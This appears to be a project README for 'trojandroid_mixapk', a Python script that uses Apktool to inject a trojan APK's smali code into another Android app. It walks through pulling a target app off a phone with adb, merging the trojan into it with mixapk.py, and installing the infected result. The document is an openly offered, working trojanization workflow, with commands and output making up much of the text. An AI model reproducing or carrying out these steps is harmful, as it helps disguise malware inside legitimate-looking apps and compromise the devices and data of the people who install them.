Entire README here https://github.com/remijouannet/trojandroid_app
--
trojandroid_mixapk
==

So this is a python script who use the wonderful [APKTOOL](https://ibotpeaches.github.io/Apktool/) to inject the trojan into another APK.

the script unpack the two APK, copy and modify the smali code of the trojan into get10 package, a few modification in the manifest is of course necessary, after this get10 can be repack, install and use without any problem.

the help message of the script

>\#  python mixapk.py -h

```
usage: mixapk.py [-h] [--apks trojanApk apkToInfect] [--adb]

ACTION

optional arguments:
  -h, --help            show this help message and exit
 --apks trojanApk apkToInfect specify the Trojan Apk and the APk to Infect
 --adb                 install the final APK with adb
```

So you have to have the Trojan APK and an APK of another app ([get10](https://play.google.com/store/apps/details?id=com.remijouannet.get10) for this example)
([a little howto I find to extract an installed app of your phone](http://codetheory.in/get-application-apk-file-from-android-device-to-your-computer/))

>  \# ./adb shell pm list packages | grep get10

```
package:com.remijouannet.get10
```

>  \# ./adb shell pm path com.remijouannet.get10

```
package:/data/app/com.remijouannet.get10-1/base.apk
```

>  \# ./adb pull /data/app/com.remijouannet.get10-1/base.apk && mv base.apk /tmp/

```
7544 KB/s (3117111 bytes in 0.403s)
```

>  \# mixapk.py --apks /PathTotrojandroid_app/app/build/outputs/apk/app-debug.apk /tmp/base.apk

let's do the magic.
if you didn't have any errors, you should find a file "app-final.pak" in your current directory.

if you have your phone in debug mode, you can push the apk to it with a simple adb command:

>\# adb install app-final.apk
